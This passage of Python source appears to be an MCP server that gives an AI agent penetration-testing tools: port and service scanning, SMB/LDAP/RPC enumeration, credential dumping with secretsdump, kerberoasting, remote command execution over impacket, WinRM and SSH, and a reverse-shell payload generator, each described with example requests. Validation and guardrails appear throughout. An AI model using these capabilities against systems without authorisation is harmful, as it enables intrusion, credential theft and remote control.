        "Fetch and show a site's /robots.txt and /sitemap.xml — often reveal hidden "
        "paths and endpoints.",
        {"type": "object", "properties": {
            "url": {"type": "string", "description": "Base site URL, e.g. "
                    "http://10.0.0.5."}},
         "required": ["url"]}),
}


# RAG metadata for purragent's client-side tool retriever: a one-line `short` for the
# catalog, a keyword/scenario-heavy `long` used to build the embedding index, and
# `examples` of user phrasings the tool answers (query-to-query matching). Emitted as
# shortDescription / longDescription / exampleQueries; plain MCP clients ignore them.
# name -> (short, long, [examples])
_META = {
    "port_discovery": (
        "Discover open TCP/UDP ports on a host.",
        "Port scanning and port discovery with nmap: find which ports are open on a "
        "single host. Presets fast (top 1000), top100, low (1-32767), high, full "
        "(1-65535); TCP SYN/connect or UDP; adjustable timing T0-T5 for filtered, "
        "firewalled or slow hosts; -Pn host-discovery toggle. The first recon step "
        "before service detection. Keywords: nmap, scan, open ports, port sweep, SYN "
        "scan, connect scan, UDP scan, firewall, filtered.",
        ["scan for open ports on 10.0.0.5", "what ports are open on the target",
         "do a full port scan", "check for open UDP ports", "port discovery on this host"]),
    "service_discovery": (
        "Fingerprint the services and versions on a host's ports.",
        "Service and version detection with nmap -sV plus default -sC NSE scripts: "
        "identify the software and version behind each open port. Optional OS "
        "detection (-O), UDP, version intensity, timing. Run after port_discovery on "
        "the open ports. Keywords: nmap -sV -sC, banner, version detection, "
        "fingerprint, service enumeration, OS detection, product version.",
        ["what service is running on port 80", "detect versions on the open ports",
         "fingerprint the services on 10.0.0.5", "run an nmap service/version scan",
         "identify the software and versions"]),
    "script_scan": (
        "Run specific nmap NSE scripts against a host.",
        "Targeted nmap NSE script scan: run named scripts such as http-title, "
        "http-methods, smb-vuln-ms17-010, ssl-enum-ciphers, or a safe wildcard like "
        "smb-vuln-*. For vulnerability detection and deeper protocol enumeration. "
        "brute/dos/exploit categories rejected. Keywords: nmap --script, NSE, vuln "
        "scan, smb-vuln, ms17-010, eternalblue detection, http-enum, ssl ciphers.",
        ["run smb-vuln-ms17-010 on the host", "check for eternalblue",
         "run nmap nse http scripts on port 80", "enumerate ssl ciphers",
         "scan with a specific nmap script"]),
    "http_headers": (
        "Fetch a web server's HTTP response headers.",
        "HTTP header grab with curl: reveal Server / X-Powered-By tech banners, "
        "cookies, security headers and redirects. Target a path (/admin, /api), HEAD "
        "or GET, follow redirects, set a custom User-Agent, http or https. Web recon. "
        "Keywords: curl -I, http headers, server banner, web technology, X-Powered-By, "
        "redirect, HSTS, set-cookie.",
        ["get the http headers of the web server", "what web server runs on port 80",
         "check headers at /admin", "follow redirects and show the headers",
         "curl the target's website headers"]),
    "ftp_anon": (
        "Check anonymous FTP login and list the root.",
        "Anonymous FTP check with nmap ftp-anon: test whether anonymous login works "
        "and list the FTP root directory — a quick anonymous foothold. Keywords: ftp, "
        "anonymous login, ftp-anon, port 21, anon ftp, directory listing.",
        ["is anonymous ftp allowed on 10.0.0.5", "check ftp anonymous login",
         "list the ftp root directory", "test anonymous ftp on port 21"]),
    "smb_enum": (
        "Enumerate SMB via null session: OS, shares, users.",
        "SMB and Windows-shares enumeration with nmap smb-* scripts over a null "
        "session: OS discovery, SMB signing / security mode, shares and users. "
        "Windows/AD recon. Keywords: smb, cifs, netbios, port 445, port 139, null "
        "session, shares, smb-enum-shares, smb-enum-users, smb-os-discovery, windows.",
        ["enumerate smb shares on 10.0.0.5", "list smb users",
         "what OS via smb", "smb null-session enumeration", "check windows shares on 445"]),
    "snmp_walk": (
        "Walk SNMP to dump a host's system info.",
        "SNMP enumeration with snmpwalk: dump system info, interfaces, processes or "
        "users depending on the OID subtree. Community string (default public), SNMP "
        "v1/v2c, custom port, start OID. Keywords: snmp, snmpwalk, community string, "
        "public, port 161, MIB, OID, udp enumeration, system description.",
        ["walk snmp on 10.0.0.5", "snmp enumeration with community public",
         "dump the snmp system info", "snmpwalk the target", "read snmp oid 1.3.6.1.2.1.1"]),
    "dns_lookup": (
        "Resolve a DNS record (A/MX/NS/TXT/PTR/…).",
        "DNS resolution with dig: look up A/AAAA/MX/NS/TXT/CNAME/SOA/PTR records, "
        "optionally against a specific resolver (@server) such as the target's own "
        "DNS. DNS recon. Keywords: dns, dig, nslookup, resolve, mx record, name "
        "server, txt record, reverse dns, ptr, resolver.",
        ["resolve example.com", "what are the MX records for the domain",
         "look up the NS records", "dig the A record via 8.8.8.8",
         "reverse dns lookup for the ip"]),
    "ssl_cert": (
        "Read a TLS service's certificate (subject, SANs).",
        "TLS/SSL certificate reader with nmap ssl-cert: show subject, SAN hostnames, "
        "issuer and validity — good for discovering extra hostnames / vhosts and "
        "self-signed or expired certs. Keywords: tls, ssl, certificate, x509, SAN, "
        "subject alternative name, https, port 443, cert expiry, self-signed, issuer.",
        ["read the ssl certificate on port 443", "what hostnames are in the tls cert",
         "check the certificate subject and SANs", "get the https certificate details"]),
    "banner_grab": (
        "Grab the service banner on one port.",
        "Single-port banner grab with nmap -sV plus the banner script: read the raw "
        "service banner/version on a chosen port for quick identification. Keywords: "
        "banner grab, service banner, version, nmap banner, netcat banner, port "
        "fingerprint, greeting.",
        ["grab the banner on port 22", "what banner does port 8080 show",
         "identify the service on this port", "read the service banner"]),
    "searchsploit": (
        "Search Exploit-DB for a product/version or CVE.",
        "Local Exploit-DB search with searchsploit: find known public exploits by "
        "product/version (e.g. 'vsftpd 2.3.4'), by CVE (--cve), or title-only. Turns "
        "a detected version into exploit leads. Offline; leads, not proof. Keywords: "
        "searchsploit, exploit-db, public exploit, CVE, PoC, known exploit, edb-id.",
        ["search exploits for vsftpd 2.3.4", "any public exploit for apache 2.4",
         "searchsploit CVE-2021-3156", "find exploit-db entries for this version"]),
    "whois": (
        "WHOIS registration info for a domain or IP.",
        "WHOIS lookup for a domain or IP, optionally against a specific WHOIS server "
        "(-h): registrar, organisation, contacts, and netblock/ASN for IPs. OSINT / "
        "recon. Keywords: whois, registration, registrar, domain owner, netblock, "
        "ASN, ip whois, abuse contact.",
        ["whois for example.com", "who owns this domain", "whois the ip address",
         "registration info for the domain"]),
    "http_request": (
        "Make an arbitrary HTTP request (method, headers, body, auth).",
        "Arbitrary HTTP request with curl: choose the method (GET/POST/PUT/DELETE/…), "
        "add headers, a body, a cookie, HTTP basic-auth or a bearer token, follow "
        "redirects. Probe endpoints, test REST/GraphQL APIs, replay a request with "
        "credentials from the engagement, check an authenticated page. Keywords: curl, "
        "http request, POST, api, rest, bearer token, basic auth, cookie, header, "
        "authenticated request, endpoint.",
        ["send a POST to the login endpoint", "make an authenticated GET with this cookie",
         "call the api with a bearer token", "test the endpoint with basic auth",
         "curl this url with a custom header"]),
    "web_content_discovery": (
        "Brute-force web directories and files (ffuf).",
        "Web content discovery / directory and file brute-force with ffuf: find hidden "
        "paths, admin panels, backups and endpoints on a web server using a preset "
        "wordlist, optional extensions, reporting status codes. Keywords: ffuf, "
        "gobuster, dirb, directory brute force, content discovery, fuzzing, hidden "
        "files, admin panel, dirbuster, wordlist. Not an auth/password brute-force.",
        ["find hidden directories on the website", "dir brute force the web server",
         "discover admin panels and backups", "fuzz for hidden php files",
         "run ffuf content discovery on the url"]),
    "whatweb": (
        "Fingerprint a website's stack (server, CMS, frameworks).",
        "Website technology fingerprinting with whatweb: detect the web server, CMS "
        "(WordPress/Joomla/Drupal), frameworks, languages, JS libraries and versions. "
        "Web recon. Keywords: whatweb, web technology, fingerprint, cms detection, "
        "wappalyzer, framework, server header, stack detection.",
        ["what technologies does this website use", "fingerprint the web stack",
         "detect the CMS on the site", "identify the web framework and versions"]),
    "nikto_scan": (
        "Scan a web server for known issues and misconfigs.",
        "Web server vulnerability scan with nikto: check for dangerous files, outdated "
        "software, default files, headers and common misconfigurations. Noisy active "
        "scan. Keywords: nikto, web vulnerability scanner, misconfiguration, dangerous "
        "files, outdated server, default files, web audit.",
        ["run nikto against the web server", "scan the website for vulnerabilities",
         "check the web server for misconfigurations", "nikto scan on port 8080"]),
    "nuclei_scan": (
        "Run nuclei templates for CVEs/exposures on a URL.",
        "Template-based vulnerability scanning with nuclei: match a URL against the "
        "community templates for CVEs, exposures, misconfigurations, default creds and "
        "takeovers. Filter by severity or tags. Keywords: nuclei, templates, CVE scan, "
        "exposure, misconfiguration, vulnerability scanner, takeover, default "
        "credentials, web vuln.",
        ["run nuclei against the target url", "scan for CVEs with nuclei",
         "check for known web vulnerabilities", "nuclei high and critical only",
         "find exposures on the website"]),
    "smb_client": (
        "List SMB shares or a share's files (smbclient).",
        "SMB share access with smbclient: list the shares on a host, or list the files "
        "inside a share, using a null session or credentials (password or NT hash / "
        "pass-the-hash). Keywords: smbclient, smb, cifs, shares, share listing, "
        "port 445, null session, pass the hash, windows file share, loot.",
        ["list the smb shares on 10.0.0.5", "browse the share with these credentials",
         "list files in the ADMIN$ share", "smbclient null session shares",
         "access smb with the NT hash"]),
    "netexec_smb": (
        "Enumerate or exec over SMB with netexec (nxc).",
        "SMB enumeration and command execution with netexec/nxc: dump shares, users, "
        "groups, rid-brute the domain, sessions, disks, logged-on users, password "
        "policy — or run a single command with admin creds (-x). Password or NT hash, "
        "null session supported. Keywords: netexec, nxc, crackmapexec, cme, smb, "
        "rid brute, --shares, --users, pass the hash, exec, lateral movement, spider.",
        ["nxc smb shares with these creds", "rid-brute the domain over smb",
         "enumerate smb users with netexec", "run whoami on the host via smb",
         "check the password policy over smb"]),
    "ldap_search": (
        "Query LDAP / Active Directory (ldapsearch).",
        "LDAP / Active Directory query with ldapsearch: enumerate users, groups, "
        "computers, service accounts, descriptions and any attributes, anonymous or "
        "authenticated bind, with a custom base DN and filter. Keywords: ldap, "
        "ldapsearch, active directory, AD, base dn, ldap filter, sAMAccountName, "
        "objectClass, port 389, 636, bind, directory enumeration.",
        ["ldap search for all users", "query active directory over ldap",
         "enumerate AD groups with ldapsearch", "anonymous ldap bind and dump",
         "search ldap with base dn DC=corp,DC=local"]),
    "rpc_enum": (
        "Enumerate a Windows host over MSRPC (rpcclient).",
        "MSRPC enumeration with rpcclient: enumerate domain users, groups and domain "
        "info over a null session or with credentials. Keywords: rpcclient, msrpc, "
        "enumdomusers, enumdomgroups, querydominfo, port 135, 445, null session, "
        "windows enumeration, SID, lsa.",
        ["rpcclient enumdomusers on the host", "enumerate domain users over rpc",
         "null session rpcclient enumeration", "query domain info with rpcclient"]),
    "secretsdump": (
        "Dump SAM/LSA or DCSync hashes (impacket-secretsdump).",
        "Credential dumping with impacket-secretsdump: extract SAM, LSA secrets and "
        "cached credentials from a host, or DCSync the whole domain (just_dc) with "
        "domain-admin / DC credentials. Needs creds (password or NT hash). Keywords: "
        "secretsdump, impacket, dump hashes, SAM, LSA, NTDS, DCSync, cached "
        "credentials, ntlm hashes, credential dump, post-exploitation.",
        ["dump hashes from the host with these creds", "secretsdump SAM and LSA",
         "dcsync the domain with the DC hash", "extract cached credentials",
         "impacket secretsdump just-dc"]),
    "impacket_exec": (
        "Run one command on Windows with creds (impacket).",
        "Remote command execution on Windows with impacket: run a single command via "
        "wmiexec, psexec, smbexec or atexec using valid credentials (password or NT "
        "hash / pass-the-hash). Not an interactive shell. Keywords: wmiexec, psexec, "
        "smbexec, atexec, impacket, remote command, RCE, lateral movement, pass the "
        "hash, run command windows, execute.",
        ["run whoami on the windows host with these creds", "wmiexec a command",
         "psexec with the NT hash to run a command", "execute ipconfig remotely via smb",
         "impacket exec with domain creds"]),
    "kerberos_roast": (
        "Request Kerberos hashes: kerberoast / AS-REP roast.",
        "Kerberos attacks with impacket: kerberoast (request TGS hashes for SPN "
        "accounts, needs domain creds) or AS-REP roast (accounts without pre-auth; a "
        "single target_user works with no creds). Output is hashcat-format for offline "
        "cracking. Keywords: kerberos, kerberoast, asreproast, AS-REP, GetUserSPNs, "
        "GetNPUsers, SPN, TGS, TGT, hashcat, offline cracking, active directory.",
        ["kerberoast the domain with these creds", "asrep roast the target user",
         "request SPN hashes for cracking", "GetNPUsers without a password",
         "kerberoasting with impacket"]),
    "mysql_query": (
        "Run a SQL query against MySQL/MariaDB.",
        "MySQL / MariaDB SQL query with the mysql client: list databases, dump tables, "
        "read data, check versions and users, with credentials. Keywords: mysql, "
        "mariadb, sql query, database, show databases, select, port 3306, dump table, "
        "db enumeration.",
        ["run a query on the mysql database", "show databases on the mysql server",
         "dump the users table from mysql", "select from the db with these creds",
         "list mysql databases"]),
    "mssql_query": (
        "Run a SQL query against MS SQL Server.",
        "Microsoft SQL Server query via netexec: run SQL with Windows or SQL-login "
        "credentials (or NT hash), enumerate databases and data. Keywords: mssql, "
        "microsoft sql server, sql query, port 1433, xp_cmdshell, sqlcmd, tsql, "
        "database enumeration, windows auth, sql login.",
        ["query the mssql server", "run sql on ms sql with these creds",
         "list databases on mssql", "select from the sql server database",
         "mssql query with windows auth"]),
    "psql_query": (
        "Run a SQL query against PostgreSQL.",
        "PostgreSQL SQL query with psql: list databases and tables, read data, check "
        "version and roles, with credentials in the connection URI. Keywords: "
        "postgresql, postgres, psql, sql query, port 5432, \\l, select, database, "
        "roles, db enumeration.",
        ["run a query on postgres", "list postgresql databases",
         "select from the postgres table", "query the postgres db with these creds"]),
    "redis_cli": (
        "Run a Redis command (redis-cli).",
        "Redis command with redis-cli: INFO, KEYS, GET, CONFIG GET and more, no-auth or "
        "with a password. Read/enumerate a Redis instance. Keywords: redis, redis-cli, "
        "port 6379, keys, get, info, config, cache, nosql, unauthenticated redis. "
        "Destructive flush/shutdown blocked.",
        ["get redis server info", "list all redis keys", "read a redis key value",
         "redis config get dir", "enumerate the redis instance"]),
    "mongo_query": (
        "Run a MongoDB command (mongosh --eval).",
        "MongoDB command with mongosh: list databases and collections, query documents, "
        "check for unauthenticated access, anonymous or with credentials. Keywords: "
        "mongodb, mongo, mongosh, nosql, port 27017, collections, db.find, "
        "unauthenticated mongo, document database.",
        ["list mongodb databases", "query a mongo collection",
         "check for unauthenticated mongodb", "run db.users.find() on mongo",
         "show mongo collections"]),
    "ssh_exec": (
        "Run one command over SSH (password or key).",
        "SSH remote command execution: run a single command on a host with a password "
        "(via sshpass) or a private key. Not interactive. Post-exploitation / lateral "
        "movement with recovered credentials. Keywords: ssh, sshpass, remote command, "
        "port 22, run command over ssh, private key, id, uname, execute, foothold.",
        ["run id over ssh with these creds", "execute a command on the linux host via ssh",
         "ssh in and run uname -a", "use the private key to run a command over ssh",
         "ssh command execution"]),
    "winrm_exec": (
        "Run one command on Windows over WinRM.",
        "WinRM remote command execution via netexec: run a single command on a Windows "
        "host with a password or NT hash. Not interactive. Keywords: winrm, evil-winrm, "
        "nxc winrm, port 5985, 5986, remote command windows, pass the hash, powershell, "
        "execute, lateral movement.",
        ["run whoami over winrm", "execute a command on windows via winrm",
         "winrm command with the NT hash", "run powershell remotely over winrm"]),
    "ftp_transfer": (
        "List an FTP directory or download a file.",
        "FTP access with curl: list a directory or download a file to stdout, anonymous "
        "or with credentials. Loot files from an FTP server. Keywords: ftp, curl ftp, "
        "port 21, download, list directory, anonymous ftp, file transfer, loot, "
        "retrieve file.",
        ["list the ftp directory", "download a file from ftp",
         "get the contents of a file over ftp", "loot the ftp server with these creds",
         "read passwords.txt from ftp"]),
    "subdomain_enum": (
        "Enumerate a domain's subdomains (subfinder).",
        "Passive subdomain enumeration with subfinder: gather subdomains of a root "
        "domain from OSINT sources without sending traffic to the target. Attack-"
        "surface discovery. Keywords: subfinder, subdomain enumeration, passive recon, "
        "OSINT, amass, dns, attack surface, subdomains, discover hosts.",
        ["enumerate subdomains of example.com", "find subdomains for the domain",
         "passive subdomain discovery", "what subdomains does this domain have",
         "run subfinder on the target domain"]),
    "dns_zone_transfer": (
        "Attempt a DNS zone transfer / AXFR.",
        "DNS zone transfer (AXFR) attempt with dig: if a name server allows it, dumps "
        "the entire zone — every host and record. Quick high-value DNS misconfig check. "
        "Keywords: zone transfer, axfr, dig axfr, dns, name server, misconfiguration, "
        "dump zone, dns records.",
        ["try a zone transfer on example.com", "attempt axfr against the name server",
         "dns zone transfer test", "dump the dns zone from the nameserver"]),
    "traceroute": (
        "Trace the network path to a host.",
        "Network path tracing with traceroute: show the hops between you and a host, "
        "UDP by default or ICMP/TCP (root). Network mapping / firewall inference. "
        "Keywords: traceroute, tracert, network path, hops, routing, latency, "
        "firewall, path discovery.",
        ["traceroute to 10.0.0.5", "trace the network path to the host",
         "how many hops to the target", "tcp traceroute to the server"]),
    "vhost_fuzz": (
        "Discover virtual hosts via Host-header fuzzing (ffuf).",
        "Virtual-host discovery by fuzzing the HTTP Host header with ffuf, auto-"
        "calibrated to drop the default response — finds name-based vhosts served on "
        "the same IP that DNS/subfinder miss. Keywords: vhost, virtual host, host "
        "header fuzzing, ffuf, name-based virtual hosts, hidden sites, subdomains on "
        "one IP, web enumeration.",
        ["find virtual hosts on this web server", "fuzz the host header for vhosts",
         "discover name-based virtual hosts", "vhost fuzzing on 10.0.0.5",
         "hidden websites on the same ip"]),
    "hash_identify": (
        "Identify the type of a password hash.",
        "Hash type identification from the hash string: guess whether it's NTLM, MD5, "
        "SHA1/256/512, bcrypt, md5crypt/sha512crypt, MySQL, LM:NT, etc. by length, "
        "charset and prefix. Use after dumping hashes to pick the right cracking mode. "
        "Keywords: hash id, hash-identifier, hashid, identify hash, NTLM, bcrypt, "
        "crypt, hashcat mode, hash type.",
        ["what type of hash is this", "identify this hash",
         "is this an NTLM hash", "which hashcat mode for this hash"]),
    "jwt_decode": (
        "Decode and analyse a JWT.",
        "JWT decoding and analysis: base64-decode the header and payload (no signature "
        "check) and flag weaknesses — alg:none (auth bypass), crackable HMAC secret, "
        "expiry. Keywords: jwt, json web token, decode jwt, alg none, bearer token, "
        "claims, HS256, token analysis.",
        ["decode this jwt", "analyse the jwt token", "is this jwt using alg none",
         "what are the claims in this token"]),
    "data_transform": (
        "Encode/decode base64, hex, URL, rot13.",
        "Data encoding/decoding helper: base64, hex, URL-encoding and rot13, encode or "
        "decode. Handy for CTF and turning captured values into readable text. "
        "Keywords: base64 decode, hex decode, url decode, encode, rot13, deobfuscate, "
        "cyberchef.",
        ["base64 decode this string", "decode this hex", "url-encode this value",
         "what does this base64 say"]),
    "cidr_expand": (
        "Expand a CIDR to its host addresses.",
        "CIDR/subnet expansion: list the individual host IPs in a network range. "
        "Keywords: cidr, subnet, expand, ip range, netmask, host list, network hosts.",
        ["expand 10.0.0.0/24", "list the hosts in this subnet",
         "what IPs are in this cidr"]),
    "ip_info": (
        "Classify an IP (private/public, loopback…).",
        "IP address classification: version (v4/v6) and whether it's private, public, "
        "loopback, link-local, multicast or reserved. Keywords: ip info, private ip, "
        "public ip, rfc1918, loopback, ip classification.",
        ["is this ip private or public", "classify this ip address",
         "what kind of ip is 10.0.0.5"]),
    "payload_gen": (
        "Generate a reverse-shell one-liner + listener.",
        "Reverse-shell payload generator: produce a one-liner (bash, nc mkfifo, "
        "python, php, perl, powershell) for a chosen listener host/port, plus the nc "
        "listener command. Generated text only — never executed. Keywords: reverse "
        "shell, revshell, payload, bash -i, nc listener, one-liner, foothold, "
        "callback, powershell reverse shell.",
        ["generate a bash reverse shell", "give me a reverse shell one-liner",
         "powershell reverse shell for this ip and port", "make a revshell payload"]),
    "default_creds": (
        "Look up default credentials for a product.",
        "Default credentials lookup: common out-of-the-box username/password pairs for "
        "a product or service (tomcat, jenkins, grafana, mysql, mssql, routers…), from "
        "a bundled list. Keywords: default credentials, default password, factory "
        "creds, admin admin, out of the box login, weak default.",
        ["default credentials for tomcat", "what's the default login for jenkins",
         "default password for this device", "common creds for grafana"]),
    "cve_lookup": (
        "Look up CVEs (KEV vs other) for a product/version.",
        "Offline CVE lookup: match a product/version against the local NVD index and "
        "list known CVEs, split into CISA KEV (known-exploited) vs other, with strict "
        "version matching to cut false positives. Keywords: cve, vulnerability lookup, "
        "known vulnerabilities, KEV, exploited, NVD, version cve, cpe.",
        ["what CVEs affect openssh 7.2", "look up vulnerabilities for apache 2.4.66",
         "known CVEs for samba 4.3.9", "any KEV for this version"]),
    "tls_analyze": (
        "Report a TLS service's protocol and cipher.",
        "TLS/SSL handshake analysis: connect and report the negotiated protocol "
        "version and cipher suite, flagging obsolete SSLv3/TLS1.0/1.1. Complements "
        "certificate reading. Keywords: tls, ssl, cipher, protocol version, weak tls, "
        "sslv3, tls1.0, handshake, encryption strength.",
        ["what tls version does this server use", "check the tls cipher on 443",
         "is this server using weak tls", "analyse the ssl handshake"]),
    "robots_sitemap": (
        "Fetch robots.txt and sitemap.xml.",
        "Fetch and show a site's /robots.txt and /sitemap.xml — Disallow entries and "
        "sitemap URLs often reveal hidden paths, admin areas and endpoints. Keywords: "
        "robots.txt, sitemap.xml, disallow, hidden paths, web recon, endpoints, "
        "crawler directives.",
        ["get the robots.txt", "check robots and sitemap for hidden paths",
         "what does the sitemap reveal", "fetch robots.txt of the site"]),
}


# --------------------------------------------------------------------------- #
# JSON-RPC plumbing
# --------------------------------------------------------------------------- #
def _result(req_id, result):
    return {"jsonrpc": "2.0", "id": req_id, "result": result}


def _error(req_id, code, message):
    return {"jsonrpc": "2.0", "id": req_id,
            "error": {"code": code, "message": message}}


def _tools_list():
    # `description` is the standard model-facing text (any MCP client works).
    # shortDescription / longDescription / exampleQueries are extra fields purragent's
    # client reads for its catalog and RAG tool-retrieval index; other clients ignore
    # them. Falls back to the normal description if a tool has no RAG metadata.
    out = []
    for name, (_b, normal, schema) in HACKTOOLS.items():
        short, long, examples = _META.get(name, (normal, normal, []))
        out.append({
            "name": name,
            "description": normal,
            "shortDescription": short,
            "longDescription": long,
            "exampleQueries": examples,
            "inputSchema": schema,
        })
    return out


def _call_tool(name, arguments):
    entry = HACKTOOLS.get(name)
    if entry is None:
        return {"content": [{"type": "text", "text": f"unknown tool: {name}"}],
                "isError": True}
    builder, _desc, _schema = entry
    try:
        built = builder(arguments or {})
    except ValueError as exc:                          # bad arguments
        return {"content": [{"type": "text", "text": f"invalid arguments: {exc}"}],
                "isError": True}
    except Exception as exc:                            # noqa: BLE001
        return {"content": [{"type": "text", "text": f"error: {exc}"}],
                "isError": True}
    # CLI tool → (argv:list, binary:str), run via subprocess. Python-native tool →
    # a str result (or a (str, is_error) tuple), already computed in-process.
    if isinstance(built, tuple) and built and isinstance(built[0], list):
        argv, binary = built
        text, is_error = _run(argv, binary)
        shown = "$ " + " ".join(argv) + "\n\n" + text
    else:
        if isinstance(built, tuple):
            text, is_error = (list(built) + [False])[:2]
        else:
            text, is_error = built, False
        shown = str(text)[:MAX_OUTPUT] or "(no output)"
    return {"content": [{"type": "text", "text": shown}], "isError": bool(is_error)}


def handle_message(msg):
    """Route one JSON-RPC request/notification; return a response dict or None."""
    method = msg.get("method")
    req_id = msg.get("id")
    params = msg.get("params") or {}

    if method == "notifications/initialized":
        return None
    if method == "initialize":
        return _result(req_id, {
            "protocolVersion": PROTOCOL_VERSION,
            "capabilities": {"tools": {"listChanged": False}},
            "serverInfo": {"name": SERVER_NAME, "version": SERVER_VERSION}})
    if method == "ping":
        return _result(req_id, {})
    if method == "tools/list":
        return _result(req_id, {"tools": _tools_list()})
    if method == "tools/call":
        return _result(req_id, _call_tool(params.get("name"),
                                          params.get("arguments") or {}))
    if req_id is not None:
        return _error(req_id, -32601, f"method not found: {method}")
    return None


def serve():
    """Read newline-delimited JSON-RPC from stdin, write replies to stdout."""
    out = sys.stdout
    for line in sys.stdin:
        line = line.strip()
        if not line:
            continue
        try:
            msg = json.loads(line)
        except json.JSONDecodeError:
            out.write(json.dumps(_error(None, -32700, "parse error")) + "\n")
            out.flush()
            continue
        response = handle_message(msg)
        if response is not None:
            out.write(json.dumps(response) + "\n")
            out.flush()


def selftest():
    """Offline check (no MCP client): list tools + validation, without touching the
    network (uses a bogus host so nmap/etc. aren't actually run against anyone)."""
    print(f"tools: {', '.join(HACKTOOLS)}")
    missing = [n for n in HACKTOOLS if n not in _META]
    print(f"[rag metadata] {'ok — every tool has short/long/examples' if not missing else 'MISSING: ' + ', '.join(missing)}")
    for label, req in (
        ("initialize", {"jsonrpc": "2.0", "id": 1, "method": "initialize"}),
        ("tools/list", {"jsonrpc": "2.0", "id": 2, "method": "tools/list"}),
    ):
        resp = handle_message(req)
        n = len(resp["result"].get("tools", [])) if label == "tools/list" else "-"
        print(f"[{label}] ok  (tools: {n})")
    # argument validation (no command actually run for the reject cases)
    for name, args, expect_err in (
        ("port_discovery", {"host": "10.0.0.5/24"}, True),    # subnet rejected
        ("port_discovery", {"host": "bad host!"}, True),      # bad chars
        ("port_discovery", {"host": "10.0.0.5"}, False),      # default fast scan ok
        ("port_discovery", {"host": "10.0.0.5", "range": "zzz"}, True),   # bad range
        ("port_discovery", {"host": "10.0.0.5", "timing": "T9"}, True),   # bad timing
        ("port_discovery", {"host": "10.0.0.5", "protocol": "udp"},
         not _is_root()),                                # udp needs root
        ("service_discovery", {"host": "10.0.0.5"}, False),   # default ok
        ("service_discovery", {"host": "10.0.0.5", "intensity": 15}, True),  # 0-9
        ("service_discovery", {"host": "10.0.0.5", "os": True},
         not _is_root()),                                # -O needs root
        ("script_scan", {"host": "10.0.0.5", "scripts": "smb-brute"}, True),  # brute
        ("smb_enum", {"host": "10.0.0.5", "timing": "T9"}, True),   # bad timing
        ("banner_grab", {"host": "10.0.0.5"}, True),      # missing port
        ("dns_lookup", {"name": "example.com", "type": "ZZZ"}, True),      # bad type
        ("http_headers", {"host": "10.0.0.5", "method": "put"}, True),     # bad method
        ("snmp_walk", {"host": "10.0.0.5", "version": "3"}, True),         # v3 n/a
        ("searchsploit", {}, True),                       # neither query nor cve
        ("searchsploit", {"cve": "not-a-cve"}, True),     # bad cve
        ("http_request", {"url": "ftp://x"}, True),       # non-http URL
        ("http_request", {"url": "http://x/", "method": "TRACE"}, True),   # bad method
        ("http_request", {"url": "http://x/api", "method": "POST"}, False),  # ok
        ("web_content_discovery", {"url": "http://x", "wordlist": "zzz"}, True),  # bad wl
        ("whatweb", {"url": "http://x", "aggression": 9}, True),   # 1-4
        ("nuclei_scan", {"url": "http://x", "severity": "HIGH!"}, True),   # bad sev
        ("hash_identify", {"hash": "5f4dcc3b5aa765d61d8327deb882cf99"}, False),  # ok
        ("jwt_decode", {"token": "notajwt"}, True),       # malformed
        ("data_transform", {"data": "x", "encoding": "morse"}, True),   # bad encoding
        ("payload_gen", {"lhost": "10.0.0.1"}, True),     # lport required
        ("cve_lookup", {"vendor": "a", "product": "b", "version": "none"}, True),  # no ver num
        ("ip_info", {"ip": "999.1.1.1"}, True),           # bad ip
        ("smb_client", {"host": "10.0.0.5"}, False),      # null-session list ok
        ("smb_client", {"host": "10.0.0.5", "username": "a b"}, True),   # bad user
        ("netexec_smb", {"host": "10.0.0.5", "action": "exec"}, True),   # exec needs cmd
        ("secretsdump", {"host": "10.0.0.5"}, True),      # needs username
        ("impacket_exec", {"host": "10.0.0.5", "username": "u", "hash": "xyz"}, True),  # bad hash
        ("kerberos_roast", {"dc": "10.0.0.5"}, True),     # needs domain
        ("kerberos_roast", {"dc": "10.0.0.5", "domain": "corp.local"}, True),  # kerb needs creds
        ("mysql_query", {"host": "10.0.0.5", "query": "show databases;"}, False),  # ok
        ("mysql_query", {"host": "10.0.0.5"}, True),      # query required
        ("redis_cli", {"host": "10.0.0.5", "command": "FLUSHALL"}, True),   # destructive
        ("ssh_exec", {"host": "10.0.0.5", "username": "root", "command": "id"}, True),  # no pass/key
        ("winrm_exec", {"host": "10.0.0.5", "command": "whoami"}, True),    # needs username
        ("ftp_transfer", {"host": "10.0.0.5", "action": "delete"}, True),   # bad action
        ("subdomain_enum", {"domain": "example.com"}, False),   # ok
        ("dns_zone_transfer", {"domain": "example.com"}, True),  # nameserver required
        ("traceroute", {"host": "10.0.0.5", "protocol": "icmp"}, not _is_root()),  # root
        ("traceroute", {"host": "10.0.0.5", "max_hops": 99}, True),   # 1-64
        ("vhost_fuzz", {"url": "http://x", "domain": "example.com", "wordlist": "zzz"},
         True),                                          # bad wordlist
    ):
        b = HACKTOOLS[name][0]
        try:
            b(args)
            got_err = False
        except ValueError:
            got_err = True
        ok = got_err == expect_err
        print(f"[validate {name}] {'ok' if ok else 'FAIL'} "
              f"(rejected={got_err}, expected={expect_err})")


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        selftest()
    else:
        serve()
